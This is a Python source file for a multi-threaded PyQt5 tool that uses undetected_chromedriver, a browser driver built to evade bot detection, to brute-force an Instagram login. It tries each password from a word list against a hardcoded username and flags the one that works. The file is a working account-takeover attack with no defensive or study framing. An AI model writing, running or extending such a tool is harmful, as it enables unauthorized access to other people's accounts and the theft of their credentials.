from PyQt5.QtCore import QThread, pyqtSignal
import undetected_chromedriver as uc

from Resources.counter import count, add_count
from pages.login_page import LoginPage

# Config var
url = 'https://www.instagram.com/accounts/login/'
# groups = split_words(password_list(input_file), num_temp)
username = 'Tim0ut_13'


class Worker(QThread):
    signal = pyqtSignal(str)

    def __init__(self, i, main_window, headless=False, x=0, words=None):
        super().__init__()
        if words is None:
            words = []
        self.driver = None
        self.i = i
        self.main_window = main_window
        self.headless = headless
        self.x = x
        self.words = words

    def run(self):
        try:
            self.running = True
            # Configuration of chrome driver options
            self.signal.emit(f'Core n°{self.i} - Starting........')
            self.signal.emit(f'Core n°{self.i} - Driver configuration')
            options = uc.ChromeOptions()
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-extensions")
            options.add_argument("--disable-application-cache")
            options.add_argument("window-size=200,1024")
            options.add_argument("--no-sandbox")
            options.add_argument("--blink-settings=imagesEnabled=false")
            prefs = {}
            prefs["profile.managed_default_content_settings.images"] = 2
            options.add_experimental_option("prefs", prefs)
            options.add_argument("--disable-gpu")

            # Configuration of headless mode
            if self.headless:
                self.signal.emit(f'Core n°{self.i} - Headless mode activated')
                options.add_argument("--headless")
            else:
                self.signal.emit(f'Core n°{self.i} - Headless mode deactivated')

            # Create and set instance of Chrome driver
            self.signal.emit(f'Core n°{self.i} - Driver creation')
            self.driver = uc.Chrome(version_main=117, options=options, use_subprocess=False,
                                    driver_executable_path="Resources/chromedriver")
            self.driver.set_window_size(200, 1024)
            self.driver.set_window_position(self.x, 0)

            self.signal.emit(f'Core n°{self.i} - Driver created')
            self.signal.emit(f'Core n°{self.i} - Starting page')
            login_page = LoginPage(self.driver, self.i)
            self.driver.implicitly_wait(3)

            # Todo:
            #   1. password_list() method who return a list of strings
            #   form a temp file. Charge the list from file HERE
            self.signal.emit(f'Core n°{self.i} - Connecting to {url}')
            login_page.open_page(url)
            self.signal.emit(f'Core n°{self.i} - handling cookies')
            login_page.is_cookies_here()

            for password in self.words:
                if not self.running or not self.driver:
                    break
                add_count(1)
                self.main_window.updateLabelCounter()
                self.signal.emit(f'Core{self.i}: ({count()}) trying password {password}')
                login_page.login_action(username, password)
                if not self.running or not self.driver:
                    break
                login_page.is_password_works(password)
                print(login_page.test)
                if login_page.test:
                    self.signal.emit(f'Core{self.i}: ({count()}) CORRECT PASSWORD: {password}')
                    self.stop()

            message = f"Core n°{self.i} - Finished"
            self.driver.quit()
            self.signal.emit(message)
        except Exception as e:
            self.signal.emit(f'Core n°{self.i} terminated successfully')
            print(e)
            self.driver.quit()
        finally:
            if self.driver:
                self.driver.quit()

    def stop(self):
        self.signal.emit('Core n°{} - Stopping'.format(self.i))
        self.running = False
        self.driver.quit()
